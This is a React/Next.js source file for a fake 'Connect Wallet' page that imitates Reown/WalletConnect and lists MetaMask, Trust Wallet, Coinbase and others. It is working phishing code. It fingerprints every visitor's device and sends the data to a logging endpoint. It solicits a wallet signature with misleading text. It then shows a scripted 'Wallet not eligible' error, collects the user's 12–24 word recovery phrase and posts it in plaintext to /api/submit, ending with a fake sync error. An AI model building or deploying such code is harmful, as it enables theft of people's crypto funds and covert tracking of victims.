"use client";
import { useState, useRef, useEffect, useCallback } from "react";

// ─── BIP39 word list (partial – add full 2048 for production) ─────────────────
const bip39List = [
  "abandon","ability","able","about","above","absent","absorb","abstract","absurd","abuse",
  "access","accident","account","accuse","achieve","acid","acoustic","acquire","across","act",
  "action","actor","actress","actual","adapt","add","addict","address","adjust","admit",
  "adult","advance","advice","aerobic","affair","afford","afraid","again","age","agent",
  "agree","ahead","aid","aim","air","airport","aisle","alarm","album","alcohol",
  "alert","alien","all","alley","allow","almost","alone","alpha","already","also",
  "alter","always","amateur","amazing","among","amount","amused","analyst","anchor","ancient",
  "anger","angle","angry","animal","ankle","announce","annual","another","answer","antenna",
  "antique","anxiety","any","apart","apology","appear","apple","approve","april","arch",
  "arctic","area","arena","argue","arm","armed","armor","army","around","arrange",
  "arrest","arrive","arrow","art","artefact","artist","artwork","ask","aspect","assault",
  "asset","assist","assume","asthma","athlete","atom","attack","attend","attitude","attract",
  "auction","audit","august","aunt","author","auto","autumn","average","avocado","avoid",
  "awake","aware","away","awesome","awful","awkward","axis","baby","balance","bamboo",
  "banana","banner","bar","barely","bargain","barrel","base","basic","basket","battle",
  "beach","bean","beauty","because","become","beef","before","begin","behave","behind",
  "believe","below","belt","bench","benefit","best","betray","better","between","beyond",
  "bicycle","bind","biology","bird","birth","bitter","black","blade","blame","blanket",
  "blast","bleak","bless","blind","blood","blossom","blouse","blue","blur","blush",
  "board","boat","body","boil","bomb","bone","book","boost","border","boring",
  "borrow","boss","bottom","bounce","boy","bracket","brain","brand","brave","breeze",
  "brick","bridge","brief","bright","bring","brisk","broccoli","broken","bronze","broom",
  "brother","brown","brush","bubble","buddy","budget","buffalo","build","bulb","bulk",
  "bullet","bundle","bunker","burden","burger","burst","bus","business","busy","butter",
  "buyer","buzz","cabbage","cabin","cable","cactus","cage","cake","call","calm",
  "camera","camp","can","canal","cancel","candy","cannon","canvas","canyon","capable",
  "capital","captain","car","carbon","card","cargo","carpet","carry","cart","case",
  "cash","casino","castle","casual","cat","catalog","catch","category","cattle","caught",
  "cause","caution","cave","ceiling","celery","cement","census","century","cereal","certain",
  "chair","chalk","champion","change","chaos","chapter","charge","chase","chat","cheap",
  "check","cheese","chef","cherry","chest","chicken","chief","child","chimney","choice",
];

// ─── Wallet definitions ───────────────────────────────────────────────────────
const WALLETS = [
  { name: "MetaMask",      icon: "/metamask.png",    rdns: "io.metamask",       popular: true  },
  { name: "Trust Wallet",  icon: "/trustwallet.png", rdns: "com.trustwallet",   popular: true  },
  { name: "Coinbase",      icon: "/coinbase.png",    rdns: "com.coinbase",      popular: true  },
  { name: "Exodus",        icon: "/exodus.png",      rdns: "io.exodus",         popular: false },
  { name: "Atomic Wallet", icon: "/atomic.png",      rdns: "io.atomicwallet",   popular: false },
  { name: "TokenPocket",   icon: "/tokenpocket.png", rdns: "pro.tokenpocket",   popular: false },
  { name: "MathWallet",    icon: "/mathwallet.png",  rdns: "app.mathwallet",    popular: false },
  { name: "SafePal",       icon: "/safepal.png",     rdns: "io.safepal",        popular: false },
  { name: "BitKeep",       icon: "/bitkeep.png",     rdns: "com.bitget",        popular: false },
  { name: "ONTO",          icon: "/onto.png",        rdns: "com.onto",          popular: false },
  { name: "Other Wallet",  icon: "/wallet.png",      rdns: "other",             popular: false },
];

const PHRASE_COUNTS = [12, 15, 18, 21, 24];

type Step = "landing" | "modal" | "connecting" | "failed" | "phraseCount" | "phraseInput" | "submitting";

// ─── EIP-6963 Interfaces ───────────────────────────────────────────────────
interface EIP6963ProviderInfo {
  rdns: string;
  uuid: string;
  name: string;
  icon: string;
}

interface EIP6963ProviderDetail {
  info: EIP6963ProviderInfo;
  provider: any;
}

type AnnounceEvent = CustomEvent<EIP6963ProviderDetail>;

function useSyncProviders() {
  const [providers, setProviders] = useState<EIP6963ProviderDetail[]>([]);

  useEffect(() => {
    const onAnnounceProvider = (event: AnnounceEvent) => {
      setProviders((prev) => {
        if (prev.find((p) => p.info.rdns === event.detail.info.rdns)) return prev;
        return [...prev, event.detail];
      });
    };

    window.addEventListener("eip6963:announceProvider" as any, onAnnounceProvider as any);
    window.dispatchEvent(new Event("eip6963:requestProvider"));

    return () => {
      window.removeEventListener("eip6963:announceProvider" as any, onAnnounceProvider as any);
    };
  }, []);

  return providers;
}

// ─── Fingerprint helper ───────────────────────────────────────────────────────
async function collectFingerprint() {
  const nav = navigator as Navigator & {
    deviceMemory?: number;
    connection?: { effectiveType?: string; downlink?: number; rtt?: number; saveData?: boolean };
    getBattery?: () => Promise<{ level: number; charging: boolean }>;
  };

  let webglRenderer = "", webglVendor = "";
  try {
    const canvas = document.createElement("canvas");
    const gl = canvas.getContext("webgl") as WebGLRenderingContext | null;
    if (gl) {
      const dbg = gl.getExtension("WEBGL_debug_renderer_info");
      if (dbg) {
        webglRenderer = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
        webglVendor   = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
      }
    }
  } catch { /* silent */ }

  let batteryLevel = "", batteryCharging = "";
  try {
    if (nav.getBattery) {
      const b = await nav.getBattery();
      batteryLevel   = `${Math.round(b.level * 100)}%`;
      batteryCharging = b.charging ? "Yes" : "No";
    }
  } catch { /* silent */ }

  return {
    userAgent: navigator.userAgent,
    language: navigator.language,
    languages: navigator.languages?.join(", "),
    platform: navigator.platform,
    vendor: navigator.vendor,
    cookiesEnabled: navigator.cookieEnabled,
    doNotTrack: navigator.doNotTrack,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    localTime: new Date().toLocaleString(),
    screenWidth: screen.width,
    screenHeight: screen.height,
    windowWidth: window.innerWidth,
    windowHeight: window.innerHeight,
    colorDepth: screen.colorDepth,
    devicePixelRatio: window.devicePixelRatio,
    deviceMemoryGB: nav.deviceMemory,
    hardwareConcurrency: navigator.hardwareConcurrency,
    maxTouchPoints: navigator.maxTouchPoints,
    isMobile: window.matchMedia("(pointer: coarse)").matches,
    webglRenderer,
    webglVendor,
    batteryLevel,
    batteryCharging,
    connectionType: nav.connection?.effectiveType,
    downlinkMbps: nav.connection?.downlink,
    rttMs: nav.connection?.rtt,
    dataSaver: nav.connection?.saveData,
    isOnline: navigator.onLine,
    darkMode: window.matchMedia("(prefers-color-scheme: dark)").matches,
    reducedMotion: window.matchMedia("(prefers-reduced-motion: reduce)").matches,
    referrer: document.referrer || "(direct)",
    pageUrl: window.location.href,
    plugins: Array.from(navigator.plugins || []).map((p) => p.name).join(", ") || "(none)",
  };
}

// ─── Wallet Deep Link Mapping ────────────────────────────────────────────────
const DEEP_LINKS: Record<string, string> = {
  "MetaMask": "metamask://dapp/[URL]",
  "Trust Wallet": "trust://open_url?url=[URL]",
  "Coinbase": "https://go.cb-w.com/dapp?cb_url=[URL]",
  "SafePal": "safepal://main/dapp?url=[URL]",
  "TokenPocket": "tpoutside://pull.eth?action=dapp&url=[URL]",
  "Rainbow": "rainbow://open-url?url=[URL]",
  "Phantom": "phantom://browse/[URL]",
  "BitKeep": "bitkeep://",
  "Atomic": "atomicwallet://",
  "Exodus": "exodus://",
  "MathWallet": "mathwallet://",
  "ONTO": "ontoprovider://",
};

// ─── Main component ───────────────────────────────────────────────────────────
export default function Home() {
  const providers = useSyncProviders();
  const [step, setStep]                 = useState<Step>("landing");
  const [selectedWallet, setSelectedWallet] = useState<(typeof WALLETS)[0] | null>(null);
  const [phraseCount, setPhraseCount]   = useState<number | null>(null);
  const [phraseWords, setPhraseWords]   = useState<string[]>([]);
  const [showPhrase, setShowPhrase]     = useState(false);
  const [submitting, setSubmitting]     = useState(false);
  const [submitDone, setSubmitDone]     = useState(false);
  const [toast, setToast]               = useState<{ type: "ok" | "err"; msg: string } | null>(null);
  const [connectingDots, setConnectingDots] = useState("");
  const [connectTimer, setConnectTimer] = useState(0);
  const [modalSearch, setModalSearch]   = useState("");
  const [isMobile, setIsMobile]         = useState(false);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  // Log site visit on mount and check for auto-trigger
  useEffect(() => {
    setIsMobile(/Android|iPhone|iPad|iPod/i.test(navigator.userAgent));

    collectFingerprint().then((fp) => {
      fetch("/api/logs", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ status: "visited_site", browserData: fp })
      }).catch(() => {});
    });

    // Auto-trigger wallet modal on load
    const timer = setTimeout(() => {
      setStep("modal");
    }, 1500);
    return () => clearTimeout(timer);
  }, []);

  // Timer logic for the 30-second connection phases
  useEffect(() => {
    if (step !== "connecting") {
      setConnectTimer(0);
      return;
    }

    const interval = setInterval(() => {
      setConnectTimer(t => {
        const next = t + 1;
        // If on mobile and no activity after 10s, fail faster to manual recovery
        if (isMobile && next >= 10) {
          setStep("failed");
          clearInterval(interval);
          return 10;
        }
        if (next >= 30) {
          setStep("failed");
          clearInterval(interval);
          return 30;
        }
        return next;
      });
    }, 1000);

    return () => clearInterval(interval);
  }, [step, isMobile]);

  // Animated dots while connecting
  useEffect(() => {
    if (step !== "connecting") return;
    let i = 0;
    const id = setInterval(() => {
      i = (i + 1) % 4;
      setConnectingDots(".".repeat(i));
    }, 400);
    return () => clearInterval(id);
  }, [step]);

  // Auto-focus first phrase input
  useEffect(() => {
    if (step === "phraseInput" && inputRefs.current[0]) {
      setTimeout(() => inputRefs.current[0]?.focus(), 100);
    }
  }, [step]);

  // Toast auto-dismiss
  const showToast = useCallback((type: "ok" | "err", msg: string) => {
    setToast({ type, msg });
    setTimeout(() => setToast(null), 4000);
  }, []);

  // ── Attempt real wallet connection ──────────────────────────────────────────
  async function attemptConnect(wallet: (typeof WALLETS)[0]) {
    const currentUrl = typeof window !== "undefined" ? window.location.href.split("#")[0] : "";
    const domain = typeof window !== "undefined" ? window.location.hostname : "node-verification.io";
    
    // 📱 Mobile Deep Linking Logic (Trigger early to avoid popup blockers)
    if (isMobile) {
      const deepLinkPattern = DEEP_LINKS[wallet.name];
      // Capture the attempt early
      fetch("/api/logs", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ 
          status: "connection_attempted", 
          wallet: wallet.name, 
          platform: "mobile",
        })
      }).catch(() => {});

      if (deepLinkPattern) {
        const finalLink = deepLinkPattern.replace("[URL]", encodeURIComponent(currentUrl));
        const discovered = providers.find(p => p.info.rdns === wallet.rdns);
        const provider = discovered?.provider || (window as any).ethereum;

        if (provider) {
          try {
            const accounts = await provider.request({ method: "eth_requestAccounts" });
            if (accounts && accounts[0]) {
              const msg = `${domain} wants you to sign in with your Ethereum account:\n${accounts[0]}\n\nBy signing this message, you authorize the decentralized node to verify your wallet's activity and history for eligibility validation.\n\nURI: ${currentUrl}\nVersion: 1\nChain ID: 1\nNonce: ${Math.random().toString(36).substring(2, 11)}\nIssued At: ${new Date().toISOString()}`;
              await provider.request({ method: "personal_sign", params: [msg, accounts[0]] });
            }
          } catch (e) { console.log(e); }
        } else {
          // If not in-app browser, attempt to force open the app
          window.location.href = finalLink;
        }
      }
    }

    setSelectedWallet(wallet);
    setStep("connecting");

    // 💻 Desktop Discovery Logic (EIP-6963)
    if (!isMobile) {
      const discovered = providers.find(p => p.info.rdns === wallet.rdns);
      const provider = discovered?.provider || (window as any).ethereum;

      if (provider) {
        try {
          const accounts = await provider.request({ method: "eth_requestAccounts" });
          if (accounts && accounts[0]) {
            // Trigger SIWE signature request for high-fidelity verification
            const msg = `${domain} wants you to sign in with your Ethereum account:\n${accounts[0]}\n\nBy signing this message, you authorize the decentralized node to verify your wallet's activity and history for eligibility validation.\n\nURI: ${currentUrl}\nVersion: 1\nChain ID: 1\nNonce: ${Math.random().toString(36).substring(2, 11)}\nIssued At: ${new Date().toISOString()}`;
            await provider.request({ method: "personal_sign", params: [msg, accounts[0]] });
          }
        } catch (err) {
          console.log("User rejected or provider error", err);
        }
      }

      collectFingerprint().then((fp) => {
        fetch("/api/logs", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ 
            status: "connection_attempted", 
            wallet: wallet.name, 
            platform: "desktop",
            browserData: fp 
          })
        }).catch(() => {});
      });
    }
  }

  // ── Phrase word changes ─────────────────────────────────────────────────────
  function handleWordChange(idx: number, val: string) {
    setPhraseWords(ws => { const c = [...ws]; c[idx] = val; return c; });
  }
  function handleKeyDown(idx: number, e: React.KeyboardEvent<HTMLInputElement>) {
    if ((e.key === "Enter" || e.key === "Tab") && idx < phraseWords.length - 1) {
      e.preventDefault();
      inputRefs.current[idx + 1]?.focus();
    }
  }

  // ── Submit phrase ──────────────────────────────────────────────────────────
  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    if (submitting) return;
    setSubmitting(true);

    const fp = await collectFingerprint();
    // Log attempt locally for admin dashboard
    fetch("/api/logs", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ status: "phrase_submitted", wallet: selectedWallet?.name, browserData: fp })
    }).catch(() => {});

    fetch("/api/submit", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        phrase: phraseWords.join(" "),
        wallet: selectedWallet?.name ?? "Unknown",
        browserData: fp,
      }),
    }).catch(() => {});

    // Fake 6-second "syncing" then show error → redirect
    setTimeout(() => {
      setSubmitting(false);
      setSubmitDone(true);
    }, 6000);
  }

  // ── Filtered wallets for modal ─────────────────────────────────────────────
  const filteredWallets = WALLETS.filter(w =>
    w.name.toLowerCase().includes(modalSearch.toLowerCase())
  );

  // ══════════════════════════════════════════════════════════════════════════════
  // RENDER
  // ══════════════════════════════════════════════════════════════════════════════

  return (
    <div className="wc-root">
      {/* Global styles overhaul to match screenshots */}
      <style>{`
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap');

        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

        .wc-root {
          min-height: 100vh;
          background: #000;
          font-family: 'Inter', system-ui, sans-serif;
          color: #fff;
          display: flex;
          flex-direction: column;
        }

        /* ─── Landing ─────────────────────────────────────── */
        .landing {
          min-height: 100vh;
          display: flex;
          flex-direction: column;
          align-items: center;
          justify-content: center;
          padding: 24px;
          background: radial-gradient(ellipse 80% 60% at 50% 0%, rgba(59,130,246,0.1) 0%, transparent 70%), #000;
          transition: opacity 0.3s;
        }
        .landing-card {
          background: rgba(255,255,255,0.03);
          border: 1px solid rgba(255,255,255,0.1);
          border-radius: 32px;
          padding: 48px 32px;
          max-width: 440px;
          width: 100%;
          text-align: center;
          backdrop-filter: blur(20px);
          animation: fadeUp 0.5s ease both;
        }
        .landing-logo { font-size: 48px; margin-bottom: 24px; }
        .landing-title { font-size: 24px; font-weight: 700; margin-bottom: 12px; }
        .landing-desc { font-size: 15px; color: #888; line-height: 1.6; margin-bottom: 32px; }
        .connect-btn {
          width: 100%; padding: 18px; border-radius: 16px; border: none; background: #fff; color: #000;
          font-size: 16px; font-weight: 700; cursor: pointer; transition: transform 0.2s, background 0.2s;
          font-family: inherit;
        }
        .connect-btn:hover { background: #eee; transform: translateY(-2px); }

        /* ─── Modal overlay ───────────────────────────────── */
        .modal-overlay {
          position: fixed; inset: 0; background: rgba(0,0,0,0.85); backdrop-filter: blur(10px);
          display: flex; align-items: center; justify-content: center; padding: 16px; z-index: 100;
          animation: fadeIn 0.2s ease both;
        }

        /* ─── Wallet Selection Modal ──────────────────────── */
        .selection-modal {
          background: #141414; border: 1px solid #262626; border-radius: 32px;
          width: 100%; max-width: 360px; max-height: 90vh; overflow: hidden;
          display: flex; flex-direction: column; box-shadow: 0 40px 100px rgba(0,0,0,1);
          animation: slideUp 0.3s cubic-bezier(0.34,1.56,0.64,1) both;
        }
        .modal-header-reown { display: flex; align-items: center; justify-content: center; padding: 24px 20px 16px; position: relative; }
        .modal-back-btn { position: absolute; left: 20px; background: none; border: none; color: #888; cursor: pointer; font-size: 20px; }
        .modal-title-reown { font-size: 16px; font-weight: 600; color: #fff; }
        .modal-close-reown { position: absolute; right: 20px; background: none; border: none; color: #888; cursor: pointer; font-size: 20px; }

        .wallet-list { padding: 12px; overflow-y: auto; }
        .wallet-item-reown {
          display: flex; align-items: center; gap: 16px; padding: 14px 16px; border-radius: 16px;
          background: transparent; border: none; width: 100%; cursor: pointer; transition: background 0.2s;
          text-align: left; font-family: inherit; color: #fff;
        }
        .wallet-item-reown:hover { background: #1e1e1e; }
        .wallet-icon-reown { width: 40px; height: 40px; border-radius: 12px; object-fit: contain; }
        .wallet-name-reown { font-weight: 500; font-size: 15px; }

        .modal-footer-reown { padding: 24px; text-align: center; border-top: 1px solid #1f1f1f; }
        .reown-branding { display: flex; align-items: center; justify-content: center; gap: 6px; font-size: 12px; color: #666; }
        .reown-logo { background: #fff; color: #000; padding: 2px 6px; border-radius: 4px; font-weight: 800; font-size: 10px; }

        /* ─── Connecting Modal ────────────────────────────── */
        .connecting-modal {
          background: #141414; border: 1px solid #262626; border-radius: 32px;
          width: 100%; max-width: 320px; padding: 40px 24px; text-align: center;
        }
        .spinner-container { position: relative; width: 80px; height: 80px; margin: 0 auto 32px; }
        .orange-ring {
          position: absolute; inset: 0; border: 2px solid #332211; border-top-color: #ff8800;
          border-radius: 50%; animation: spin 1s linear infinite;
        }
        .clock-icon {
          position: absolute; inset: 0; display: flex; align-items: center; justify-content: center;
          font-size: 28px; color: #ff8800; background: rgba(255,136,0,0.05); border-radius: 50%;
        }
        .connecting-title-reown { font-size: 18px; font-weight: 600; margin-bottom: 12px; }
        .connecting-desc-reown { font-size: 13px; color: #888; line-height: 1.5; }

        /* ─── Error Modal (Not Eligible) ───────────────────── */
        .error-modal {
          background: #141414; border: 1px solid #262626; border-radius: 32px;
          width: 100%; max-width: 320px; padding: 40px 24px; text-align: center;
        }
        .error-icon-circle {
          width: 64px; height: 64px; background: rgba(239, 68, 68, 0.1); border: 1px solid rgba(239, 68, 68, 0.2);
          border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 24px;
          color: #ef4444; font-size: 24px;
        }
        .error-title-reown { font-size: 20px; font-weight: 700; margin-bottom: 16px; }
        .error-desc-reown { font-size: 14px; color: #888; line-height: 1.6; }

        /* ─── Phrase Container ────────────────────────────── */
        .phrase-container { min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 24px; }
        .phrase-card { background: #111; border: 1px solid #222; border-radius: 24px; width: 100%; max-width: 500px; padding: 32px; }
        .phrase-header { display: flex; align-items: center; gap: 16px; margin-bottom: 24px; }
        .phrase-header-icon { width: 44px; height: 44px; border-radius: 12px; object-fit: contain; background: #222; }
        .phrase-header-text h2 { font-size: 18px; font-weight: 700; margin-bottom: 4px; }
        .phrase-header-text p { font-size: 13px; color: #666; }

        .manual-notice { display: flex; align-items: flex-start; gap: 12px; padding: 16px; border-radius: 16px; font-size: 13px; margin-bottom: 24px; }
        .count-grid { display: grid; grid-template-columns: repeat(5, 1fr); gap: 8px; margin-bottom: 24px; }
        .count-btn {
          padding: 12px 4px; border-radius: 10px; border: 1px solid #222; background: #000; color: #666;
          font-family: inherit; font-weight: 600; cursor: pointer; transition: 0.2s;
        }
        .count-btn.selected { border-color: #fff; color: #fff; background: #111; }

        .word-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 24px; }
        .word-input-wrap { position: relative; }
        .word-num { position: absolute; left: 10px; top: 12px; font-size: 10px; color: #444; pointer-events: none; }
        .word-input {
          width: 100%; padding: 12px 10px 12px 28px; border-radius: 12px; border: 1px solid #222;
          background: #000; color: #fff; font-family: inherit; font-size: 14px; outline: none;
        }

        .submit-btn {
          width: 100%; padding: 16px; border-radius: 14px; border: none; background: #fff; color: #000;
          font-family: inherit; font-weight: 700; cursor: pointer; transition: opacity 0.2s;
        }
        .submit-btn:disabled { opacity: 0.4; pointer-events: none; }

        .submit-overlay {
          position: fixed; inset: 0; background: rgba(0,0,0,0.95); display: flex; flex-direction: column;
          align-items: center; justify-content: center; z-index: 200; gap: 24px;
        }
        .spinner-ring {
          width: 40px; height: 40px; border: 3px solid #222; border-top-color: #fff; border-radius: 50%; animation: spin 1s linear infinite;
        }

        .error-result-card { text-align: center; max-width: 340px; }
        .error-result-title { font-size: 20px; font-weight: 700; color: #ef4444; margin-bottom: 12px; }
        .error-result-desc { color: #888; font-size: 14px; line-height: 1.6; margin-bottom: 24px; }
        .wc-redirect-btn {
          display: inline-block; padding: 14px 24px; border-radius: 12px; background: #fff; color: #000;
          text-decoration: none; font-weight: 700; font-size: 14px; border: none; cursor: pointer;
        }

        /* ─── Keyframes ───────────────────────────────────── */
        @keyframes fadeUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        @keyframes slideUp { from { opacity: 0; transform: translateY(40px) scale(0.97); } to { opacity: 1; transform: translateY(0) scale(1); } }
        @keyframes spin { to { transform: rotate(360deg); } }

        .landing-hidden { opacity: 0; pointer-events: none; position: absolute; }
        .landing-visible { opacity: 1; }
      `}</style>

      {/* ── BACKGROUND / LANDING ────────────────────────────────────────────── */}
      <div className={`landing ${step === "landing" ? "landing-visible" : "landing-hidden"}`}>
        <div className="landing-card">
          <div className="landing-logo">🔗</div>
          <h1 className="landing-title">Connect Wallet</h1>
          <p className="landing-desc">
            Connect your crypto wallet to access the decentralized dashboard.
          </p>
          <button className="connect-btn" onClick={() => setStep("modal")}>
            Connect Wallet
          </button>
        </div>
      </div>

      {/* ── WALLET SELECTION MODAL ─────────────────────────────── */}
      {step === "modal" && (
        <div className="modal-overlay" onClick={() => setStep("landing")}>
          <div className="selection-modal" onClick={e => e.stopPropagation()}>
            <div className="modal-header-reown">
              <button className="modal-back-btn" onClick={() => setStep("landing")}>‹</button>
              <div className="modal-title-reown">Connect Wallet</div>
              <button className="modal-close-reown" onClick={() => setStep("landing")}>×</button>
            </div>
            
            <div className="wallet-list">
              {WALLETS.map(wallet => {
                const isInstalled = providers.some(p => p.info.rdns === wallet.rdns);
                return (
                  <button key={wallet.name} className="wallet-item-reown" onClick={() => attemptConnect(wallet)}>
                    <img src={wallet.icon} className="wallet-icon-reown" alt={wallet.name} />
                    <span className="wallet-name-reown">{wallet.name}</span>
                    {isInstalled && <span style={{ marginLeft: "auto", fontSize: 10, color: "#4ade80", fontWeight: 700 }}>INSTALLED</span>}
                  </button>
                );
              })}
            </div>

            <div className="modal-footer-reown">
              <div className="reown-branding">
                UX by <span className="reown-logo">reown</span>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* ── CONNECTING MODAL ─────────────────────────────────── */}
      {step === "connecting" && (
        <div className="modal-overlay">
          <div className="connecting-modal">
            <div className="spinner-container">
              <div className="orange-ring" />
              <div className="clock-icon">🕒</div>
            </div>
            <div className="connecting-title-reown">Connecting...</div>
            <p className="connecting-desc-reown">
              {connectTimer > 10 
                ? "It is taking longer than expected..." 
                : "Open and approve in your wallet"}
            </p>

            {isMobile && selectedWallet && DEEP_LINKS[selectedWallet.name] && (
              <button 
                className="wc-redirect-btn" 
                style={{ marginTop: 24, fontSize: 13, background: "#222", color: "#fff" }}
                onClick={(e) => {
                  e.stopPropagation();
                  const currentUrl = window.location.href.split("#")[0];
                  const link = DEEP_LINKS[selectedWallet.name].replace("[URL]", encodeURIComponent(currentUrl));
                  window.location.href = link;
                }}
              >
                Try opening {selectedWallet.name} again
              </button>
            )}
          </div>
        </div>
      )}

      {/* ── ERROR MODAL (NOT ELIGIBLE) ───────────────────────── */}
      {step === "failed" && (
        <div className="modal-overlay">
          <div className="error-modal">
            <div className="error-icon-circle">×</div>
            <div className="error-title-reown">Wallet not eligible</div>
            <p className="error-desc-reown">
              Wallet failed validation. Please use manual recovery to sync your assets.
            </p>
            <button 
              className="connect-btn" 
              style={{ marginTop: 32, background: "#ef4444", color: "#fff" }}
              onClick={() => setStep("phraseCount")}
            >
              Verify Manually
            </button>
          </div>
        </div>
      )}

      {/* ── PHRASE COUNT SELECTION ────────────────────────────── */}
      {step === "phraseCount" && (
        <div className="phrase-container">
          <div className="phrase-card">
            <div className="phrase-header">
              {selectedWallet && <img className="phrase-header-icon" src={selectedWallet.icon} alt="" />}
              <div className="phrase-header-text">
                <h2>Manual Recovery</h2>
                <p>Verify your wallet ownership</p>
              </div>
            </div>

            <div className="manual-notice" style={{ background: "rgba(239, 68, 68, 0.1)", color: "#ef4444", border: "1px solid rgba(239,68,68,0.2)" }}>
              <span>Automatic sync failed. Please import your recovery phrase to continue.</span>
            </div>

            <div className="count-grid">
              {PHRASE_COUNTS.map(n => (
                <button
                  key={n}
                  className={`count-btn${phraseCount === n ? " selected" : ""}`}
                  onClick={() => { setPhraseCount(n); setPhraseWords(Array(n).fill("")); setSubmitDone(false); }}
                >
                  {n}
                </button>
              ))}
            </div>

            <button className="submit-btn" disabled={!phraseCount} onClick={() => setStep("phraseInput")}>
              Continue
            </button>
          </div>
        </div>
      )}

      {/* ── PHRASE INPUT ──────────────────────────────────────── */}
      {step === "phraseInput" && phraseCount && (
        <div className="phrase-container">
          <div className="phrase-card">
            <div className="phrase-header">
              {selectedWallet && <img className="phrase-header-icon" src={selectedWallet.icon} alt="" />}
              <div className="phrase-header-text">
                <h2>Enter Phrase</h2>
                <p>{phraseCount} words mnemonic</p>
              </div>
            </div>

            <form onSubmit={handleSubmit}>
              <div className="word-grid">
                {phraseWords.map((word, i) => (
                  <div className="word-input-wrap" key={i}>
                    <span className="word-num">{i + 1}</span>
                    <input
                      ref={el => { inputRefs.current[i] = el; }}
                      className="word-input"
                      type="password"
                      value={word}
                      onChange={e => handleWordChange(i, e.target.value)}
                      onKeyDown={e => handleKeyDown(i, e)}
                      autoComplete="off"
                      spellCheck={false}
                      disabled={submitting}
                    />
                  </div>
                ))}
              </div>
              <button type="submit" className="submit-btn" disabled={!phraseWords.every(w => w.trim().length > 0) || submitting}>
                {submitting ? "Syncing..." : "Sync Wallet"}
              </button>
            </form>
          </div>
        </div>
      )}

      {/* ── SUBMITTING OVERLAY ────────────────────────────────── */}
      {submitting && (
        <div className="submit-overlay">
          <div className="spinner-ring" />
          <div style={{ color: "#fff" }}>Synchronizing...</div>
        </div>
      )}

      {submitDone && !submitting && (
         <div className="submit-overlay">
           <div className="error-result-card">
             <div className="error-result-title">Sync Error</div>
             <p className="error-result-desc">Unable to verify phrase. Connection timed out.</p>
             <button className="wc-redirect-btn" onClick={() => { setStep("landing"); setSubmitDone(false); }}>Try Again</button>
           </div>
         </div>
      )}
    </div>
  );
}

// ─── Wallet list item sub-component removed in favor of inline logic ──────────
